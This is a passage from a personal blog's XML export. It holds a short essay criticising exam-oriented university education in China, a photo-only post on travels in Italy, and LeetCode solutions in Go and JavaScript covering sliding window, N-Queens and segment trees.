<p>当我在复习的时候，我完全无法专注，只得逼迫自己来复习，因为我对考试完全没有热情，然而这种效率是极其低下的。在我刚上大学的时候，我还好好复习功课希望去得到一个好的成绩。然而现在我只想赶快考完了事，只要不挂科就行，因为我真正单纯地认为，这种考试完全无法对我的能力有很大的提升，而我也认为，这种考试也不能检验出一个人的能力如何。作为一个实践性极强的专业，我不认为这种考试可以评价一个人的水平如何。当然，我也认为，我不应该被这种考试所评判。</p>
<p>中国的大学的教育更像是延续了高中的应试教育，然而它却只继承了高中教育的缺点，一切为应试做准备。落后的评级制度也诞生了许多很不称职的教师，他们只会单调呆板地念着数十年如一日的PPT。而真正钻研教学的老师，却无法得到升迁。</p>
<p>中国的高等教育，确实应该改革了…</p>
]]></content>
      <categories>
        <category>杂文</category>
      </categories>
      <tags>
        <tag>杂论</tag>
        <tag>教育</tag>
      </tags>
  </entry>
  <entry>
    <title>关于意大利</title>
    <url>/2020/02/29/Italy-memory/</url>
    <content><![CDATA[<h3 id="蛋堡"><a class="markdownIt-Anchor" href="#蛋堡"></a> 蛋堡</h3>
<p><img src="/2020/02/29/Italy-memory/Italy1.jpg" alt="蛋堡" title="蛋堡"></p>
<h3 id="那不勒斯"><a class="markdownIt-Anchor" href="#那不勒斯"></a> 那不勒斯</h3>
<p><img src="/2020/02/29/Italy-memory/Italy2.jpg" alt="那不勒斯" title="那不勒斯"></p>
<h3 id="卡布里岛"><a class="markdownIt-Anchor" href="#卡布里岛"></a> 卡布里岛</h3>
<p><img src="/2020/02/29/Italy-memory/Italy3.jpg" alt="卡布里岛" title="卡布里岛"><a id="more"></a></p>
<h3 id="卡布里岛上的购物街"><a class="markdownIt-Anchor" href="#卡布里岛上的购物街"></a> 卡布里岛上的购物街</h3>
<p><img src="/2020/02/29/Italy-memory/Italy4.jpg" alt="卡布里岛上的购物街" title="卡布里岛上的购物街"></p>
<h3 id="傍晚的苏莲托"><a class="markdownIt-Anchor" href="#傍晚的苏莲托"></a> 傍晚的苏莲托</h3>
<p><img src="/2020/02/29/Italy-memory/Italy5.jpg" alt="傍晚的苏莲托" title="傍晚的苏莲托"></p>
<h3 id="酒店在举办音乐会"><a class="markdownIt-Anchor" href="#酒店在举办音乐会"></a> 酒店在举办音乐会</h3>
<h3 id="酒店在举办音乐会-2"><a class="markdownIt-Anchor" href="#酒店在举办音乐会-2"></a> <img src="/2020/02/29/Italy-memory/Italy6.jpg" alt="酒店在举办音乐会" title="酒店在举办音乐会"></h3>
<h3 id="凯旋门"><a class="markdownIt-Anchor" href="#凯旋门"></a> 凯旋门</h3>
<p><img src="/2020/02/29/Italy-memory/Italy7.jpg" alt="凯旋门" title="凯旋门"></p>
<h3 id="罗马斗兽场外部"><a class="markdownIt-Anchor" href="#罗马斗兽场外部"></a> 罗马斗兽场外部</h3>
<p><img src="/2020/02/29/Italy-memory/Italy8.jpg" alt="罗马斗兽场外部" title="罗马斗兽场外部"></p>
<h3 id="罗马斗兽场内部"><a class="markdownIt-Anchor" href="#罗马斗兽场内部"></a> 罗马斗兽场内部</h3>
<p><img src="/2020/02/29/Italy-memory/Italy9.jpg" alt="罗马斗兽场内部" title="罗马斗兽场内部"></p>
<h3 id="凯旋门正面"><a class="markdownIt-Anchor" href="#凯旋门正面"></a> 凯旋门正面</h3>
<p><img src="/2020/02/29/Italy-memory/Italy10.jpg" alt="凯旋门" title="凯旋门"></p>
<h3 id="西班牙广场"><a class="markdownIt-Anchor" href="#西班牙广场"></a> 西班牙广场</h3>
<p><img src="/2020/02/29/Italy-memory/Italy11.jpg" alt="西班牙广场" title="西班牙广场"></p>
<h3 id><a class="markdownIt-Anchor" href="#"></a> </h3>
<p><img src="/2020/02/29/Italy-memory/Italy12.jpg" alt="西班牙广场" title="西班牙广场"></p>
<p><img src="/2020/02/29/Italy-memory/Italy13.jpg" alt="西班牙广场" title="西班牙广场"></p>
<h3 id="梵蒂冈"><a class="markdownIt-Anchor" href="#梵蒂冈"></a> 梵蒂冈</h3>
<p><img src="/2020/02/29/Italy-memory/Italy14.jpg" alt="梵蒂冈" title="梵蒂冈"></p>
<h3 id="瑞士雇佣兵"><a class="markdownIt-Anchor" href="#瑞士雇佣兵"></a> 瑞士雇佣兵</h3>
<p><img src="/2020/02/29/Italy-memory/Italy15.jpg" alt="瑞士雇佣兵" title="瑞士雇佣兵"></p>
<p><img src="/2020/02/29/Italy-memory/Italy16.jpg" alt></p>
<p><img src="/2020/02/29/Italy-memory/Italy17.jpg" alt></p>
<h3 id="巨大的花园"><a class="markdownIt-Anchor" href="#巨大的花园"></a> 巨大的花园</h3>
<p><img src="/2020/02/29/Italy-memory/Italy18.jpg" alt></p>
<p><img src="/2020/02/29/Italy-memory/Italy19.jpg" alt></p>
<p><img src="/2020/02/29/Italy-memory/Italy20.jpg" alt></p>
<h3 id="佛罗伦萨"><a class="markdownIt-Anchor" href="#佛罗伦萨"></a> 佛罗伦萨</h3>
<p><img src="/2020/02/29/Italy-memory/Italy21.jpg" alt></p>
<p><img src="/2020/02/29/Italy-memory/Italy22.jpg" alt></p>
<h3 id="威尼斯"><a class="markdownIt-Anchor" href="#威尼斯"></a> 威尼斯</h3>
<p><img src="/2020/02/29/Italy-memory/Italy23.jpg" alt="威尼斯" title="威尼斯"></p>
<p><img src="/2020/02/29/Italy-memory/Italy24.jpg" alt="威尼斯" title="威尼斯"></p>
<p><img src="/2020/02/29/Italy-memory/Italy25.jpg" alt></p>
<p><img src="/2020/02/29/Italy-memory/Italy26.jpg" alt></p>
<p><img src="/2020/02/29/Italy-memory/Italy27.jpg" alt></p>
<h3 id="传说中罗密欧与朱丽叶相遇的地方"><a class="markdownIt-Anchor" href="#传说中罗密欧与朱丽叶相遇的地方"></a> 传说中罗密欧与朱丽叶相遇的地方</h3>
<p><img src="/2020/02/29/Italy-memory/Italy28.jpg" alt="传说中罗密欧与朱丽叶相遇的地方" title="传说中罗密欧与朱丽叶相遇的地方"></p>
]]></content>
      <categories>
        <category>旅行</category>
      </categories>
      <tags>
        <tag>旅行</tag>
      </tags>
  </entry>
  <entry>
    <title>LeetCode-1004-最大连续1的个数III</title>
    <url>/2021/02/19/LeetCode-1004/</url>
    <content><![CDATA[<h2 id="description"><a class="markdownIt-Anchor" href="#description"></a> Description:</h2>
<p>给定一个由若干 <code>0</code> 和 <code>1</code> 组成的数组 <code>A</code>，我们最多可以将 <code>K</code> 个值从 0 变成 1 。</p>
<p>返回仅包含 1 的最长（连续）子数组的长度。</p>
<h2 id="examples"><a class="markdownIt-Anchor" href="#examples"></a> Examples:</h2>
<p>示例 1：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：A &#x3D; [1,1,1,0,0,0,1,1,1,1,0], K &#x3D; 2</span><br><span class="line">输出：6</span><br><span class="line">解释： </span><br><span class="line">[1,1,1,0,0,1,1,1,1,1,1]</span><br><span class="line">粗体数字从 0 翻转到 1，最长的子数组长度为 6。</span><br></pre></td></tr></table></figure>
<p>示例 2：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：A &#x3D; [0,0,1,1,0,0,1,1,1,0,1,1,0,0,0,1,1,1,1], K &#x3D; 3</span><br><span class="line">输出：10</span><br><span class="line">解释：</span><br><span class="line">[0,0,1,1,1,1,1,1,1,1,1,1,0,0,0,1,1,1,1]</span><br><span class="line">粗体数字从 0 翻转到 1，最长的子数组长度为 10。</span><br></pre></td></tr></table></figure>
<h2 id="solution"><a class="markdownIt-Anchor" href="#solution"></a> Solution:</h2>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">longestOnes</span><span class="params">(A []<span class="keyword">int</span>, K <span class="keyword">int</span>)</span> <span class="title">int</span></span> &#123;</span><br><span class="line">    size := <span class="built_in">len</span>(A)</span><br><span class="line">    left, right := <span class="number">0</span>, <span class="number">0</span></span><br><span class="line">    res, sum := <span class="number">0</span>, <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> right &lt; size &#123;</span><br><span class="line">        sum += A[right] ^ <span class="number">1</span></span><br><span class="line">        <span class="keyword">for</span> sum &gt; K &#123;</span><br><span class="line">            sum -= (A[left] ^ <span class="number">1</span>)</span><br><span class="line">            left += <span class="number">1</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        res = max(res, right-left+<span class="number">1</span>)</span><br><span class="line">        right += <span class="number">1</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">max</span><span class="params">(a,b <span class="keyword">int</span>)</span> <span class="title">int</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> a &gt; b&#123;</span><br><span class="line">        <span class="keyword">return</span> a</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> b</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>leetcode</tag>
      </tags>
  </entry>
  <entry>
    <title>LeetCode-52-N皇后II</title>
    <url>/2021/02/19/LeetCode-52/</url>
    <content><![CDATA[<h2 id="description"><a class="markdownIt-Anchor" href="#description"></a> Description:</h2>
<p>n 皇后问题 研究的是如何将 n 个皇后放置在 n×n 的棋盘上，并且使皇后彼此之间不能相互攻击。</p>
<p>给你一个整数 n ，返回 n 皇后问题 不同的解决方案的数量。</p>
<h2 id="examples"><a class="markdownIt-Anchor" href="#examples"></a> Examples:</h2>
<p><strong>示例 1：</strong></p>
<p><img src="https://assets.leetcode.com/uploads/2020/11/13/queens.jpg" alt="img"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：n &#x3D; 4</span><br><span class="line">输出：2</span><br><span class="line">解释：如上图所示，4 皇后问题存在两个不同的解法。</span><br></pre></td></tr></table></figure>
<p><strong>示例 2：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：n &#x3D; 1</span><br><span class="line">输出：1</span><br></pre></td></tr></table></figure>
<h2 id="solution"><a class="markdownIt-Anchor" href="#solution"></a> Solution:</h2>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">totalNQueens</span><span class="params">(n <span class="keyword">int</span>)</span> <span class="title">int</span></span> &#123;</span><br><span class="line">    res := <span class="number">0</span></span><br><span class="line">    board := <span class="built_in">make</span>([][]<span class="keyword">int</span>, n)</span><br><span class="line">    <span class="keyword">for</span> i:=<span class="number">0</span>; i&lt;n; i++&#123;</span><br><span class="line">        board[i] = <span class="built_in">make</span>([]<span class="keyword">int</span>, n)</span><br><span class="line">    &#125;</span><br><span class="line">    dfs(<span class="number">0</span>, &amp;board, &amp;res, n)</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">dfs</span><span class="params">(row <span class="keyword">int</span>, board *[][]<span class="keyword">int</span>, res *<span class="keyword">int</span>, n <span class="keyword">int</span>)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> row &gt; n<span class="number">-1</span>&#123;</span><br><span class="line">        *res += <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> index:=<span class="number">0</span>; index&lt;n; index++&#123;</span><br><span class="line">        <span class="keyword">if</span> isValid(*board, row, index, n) &#123;</span><br><span class="line">            (*board)[row][index] = <span class="number">1</span></span><br><span class="line">            dfs(row+<span class="number">1</span>, board, res, n)</span><br><span class="line">            (*board)[row][index] = <span class="number">0</span></span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">isValid</span><span class="params">(board [][]<span class="keyword">int</span>, row, col, n <span class="keyword">int</span>)</span> <span class="title">bool</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> row == <span class="number">0</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> x:=<span class="number">0</span>; x&lt;row; x++&#123;</span><br><span class="line">        <span class="comment">// 判断列是否冲突</span></span><br><span class="line">        <span class="keyword">if</span> board[x][col] == <span class="number">1</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 判断对角线是否冲突</span></span><br><span class="line">        <span class="keyword">if</span> x+n &gt; row+col &amp;&amp; x&lt; row+col &amp;&amp; board[x][row+col-x] == <span class="number">1</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">        &#125;</span><br><span class="line">       </span><br><span class="line">        <span class="keyword">if</span> x+col-row &lt;= n<span class="number">-1</span> &amp;&amp; x+col &gt;= row &amp;&amp; board[x][x+col-row] == <span class="number">1</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>Leetcode</tag>
      </tags>
  </entry>
  <entry>
    <title>LeetCode307-区域和检索</title>
    <url>/2020/10/15/LeetCode307-%E5%8C%BA%E5%9F%9F%E5%92%8C%E6%A3%80%E7%B4%A2/</url>
    <content><![CDATA[<h2 id="description"><a class="markdownIt-Anchor" href="#description"></a> Description</h2>
<p>给定一个整数数组 nums，求出数组从索引 i 到 j  (i ≤ j) 范围内元素的总和，包含 i,  j 两点。</p>
<p>update(i, val) 函数可以通过将下标为 i 的数值更新为 val，从而对数列进行修改。</p>
<h2 id="examples"><a class="markdownIt-Anchor" href="#examples"></a> Examples</h2>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Given nums &#x3D; [1, 3, 5]</span><br><span class="line"></span><br><span class="line">sumRange(0, 2) -&gt; 9</span><br><span class="line">update(1, 2)</span><br><span class="line">sumRange(0, 2) -&gt; 8</span><br></pre></td></tr></table></figure>
<a id="more"></a>
<h2 id="thought"><a class="markdownIt-Anchor" href="#thought"></a> Thought</h2>
<h3 id="segement-tree线段树"><a class="markdownIt-Anchor" href="#segement-tree线段树"></a> Segement Tree(线段树)</h3>
<p>一颗线段树的构造就是根据区间的性质的来构造的, 如下是一棵区间<code>[0, 3]</code>的线段树，每个<code>[start, end]</code>都是一个二叉树中的节点。</p>
<pre class="mermaid">graph TD;
	A["[0,3]"] --> B["[0,1]"];
	A["[0,3]"] --> C["[2,3]"];
	B --> D["[0,0]"];
	B --> E["[1,1]"];
	C --> F["[2,2]"];
	C --> G["[3,3]"];</pre>
<p>区间划分大概就是上述的区间划分。可以看出每次都将区间的长度一分为二,数列长度为<code>n</code>,所以线段树的高度是<code>log(n)</code>,这是很多高效操作的基础。<br>
上述的区间存储的只是区间的左右边界。我们可以将区间的最大值加入进来,也就是树中的<code>Node</code>需要存储<code>left</code>，<code>right</code>左右子节点外，还需要存储<code>start</code>, <code>end</code>, <code>val</code>区间的范围和区间内表示的值。</p>
<p><strong>可以储存不同的值，例如区间内的最大值，最小值，区间的求和等等。</strong></p>
<p>因为每次将区间的长度一分为二,所有创造的节点个数，即底层有<code>n</code>个节点，那么倒数第二次约<code>n/2</code>个节点，倒数第三次约<code>n/4</code>个节点，依次类推：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">n + 1&#x2F;2 * n + 1&#x2F;4 * n + 1&#x2F;8 * n + ...</span><br><span class="line">&#x3D;   (1 + 1&#x2F;2 + 1&#x2F;4 + 1&#x2F;8 + ...) * n</span><br><span class="line">&#x3D;   2n</span><br></pre></td></tr></table></figure>
<p><strong>所以构造线段树的时间复杂度和空间复杂度都为<code>O(n)</code>。</strong></p>
<h2 id="solution"><a class="markdownIt-Anchor" href="#solution"></a> Solution</h2>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">segmentTree</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="title">constructor</span>(<span class="params">start,end,sum</span>)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.start = start;</span><br><span class="line">        <span class="built_in">this</span>.end = end;</span><br><span class="line">        <span class="built_in">this</span>.sum = sum;</span><br><span class="line">        <span class="built_in">this</span>.left = <span class="built_in">this</span>.right = <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> NumArray = <span class="function"><span class="keyword">function</span>(<span class="params">nums</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// console.log(nums.length);</span></span><br><span class="line">    <span class="built_in">this</span>.segmentTree = build(<span class="number">0</span>,nums.length-<span class="number">1</span>,nums);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> build = <span class="function"><span class="keyword">function</span>(<span class="params">left,right,array</span>)</span>&#123;</span><br><span class="line">    <span class="function"><span class="title">if</span>(<span class="params">left &gt; right</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> root = <span class="keyword">new</span> segmentTree(left,right,array[left]);</span><br><span class="line">    <span class="function"><span class="title">if</span>(<span class="params">left === right</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">let</span> mid = <span class="built_in">Math</span>.floor((left+right)/<span class="number">2</span>);</span><br><span class="line">    root.left = build(left,mid,array);</span><br><span class="line">    root.right = build(mid+<span class="number">1</span>,right,array);</span><br><span class="line">    root.sum = root.left.sum+root.right.sum;</span><br><span class="line">    <span class="keyword">return</span> root;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">NumArray.prototype.update = <span class="function"><span class="keyword">function</span>(<span class="params">i,val</span>) </span>&#123;</span><br><span class="line">    modify(<span class="built_in">this</span>.segmentTree,i,val);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> modify = <span class="function"><span class="keyword">function</span>(<span class="params">root,index,value</span>)</span>&#123;</span><br><span class="line">    <span class="function"><span class="title">if</span>(<span class="params">root.start == index &amp;&amp; root.end == index</span>)</span>&#123;</span><br><span class="line">        root.sum = value;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> mid = <span class="built_in">Math</span>.floor((root.start+root.end)/<span class="number">2</span>);</span><br><span class="line">    <span class="function"><span class="title">if</span>(<span class="params">index&lt;=mid</span>)</span>&#123;</span><br><span class="line">        modify(root.left,index,value);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        modify(root.right,index,value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    root.sum = root.left.sum+root.right.sum;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/** </span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param <span class="type">&#123;number&#125;</span> </span>i </span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param <span class="type">&#123;number&#125;</span> <span class="variable">j</span></span></span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return <span class="type">&#123;number&#125;</span></span></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">NumArray.prototype.sumRange = <span class="function"><span class="keyword">function</span>(<span class="params">i,j</span>) </span>&#123;</span><br><span class="line">   <span class="built_in">console</span>.log(<span class="built_in">this</span>.segmentTree);</span><br><span class="line">   <span class="keyword">let</span> res = query(<span class="built_in">this</span>.segmentTree,i,j);</span><br><span class="line">   <span class="keyword">return</span> res;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> query = <span class="function"><span class="keyword">function</span>(<span class="params">root,start,end</span>)</span>&#123;</span><br><span class="line">     <span class="function"><span class="title">if</span>(<span class="params">start == root.start &amp;&amp; root.end == end</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> root.sum;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> mid = <span class="built_in">Math</span>.floor((root.start+root.end)/<span class="number">2</span>);</span><br><span class="line">    <span class="keyword">let</span> leftsum=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">let</span> rightsum=<span class="number">0</span>;</span><br><span class="line">    <span class="comment">//左子区</span></span><br><span class="line">    <span class="function"><span class="title">if</span>(<span class="params">mid &gt;= start</span>)</span>&#123;</span><br><span class="line">        <span class="function"><span class="title">if</span>(<span class="params">mid&lt;end</span>)</span>&#123;</span><br><span class="line">            leftsum = query(root.left,start,mid);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            leftsum = query(root.left,start,end);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//右子区</span></span><br><span class="line">    <span class="function"><span class="title">if</span>(<span class="params">mid&lt;end</span>)</span>&#123;</span><br><span class="line">        <span class="function"><span class="title">if</span>(<span class="params">start &lt;= mid</span>)</span>&#123;</span><br><span class="line">            rightsum = query(root.right,mid+<span class="numbe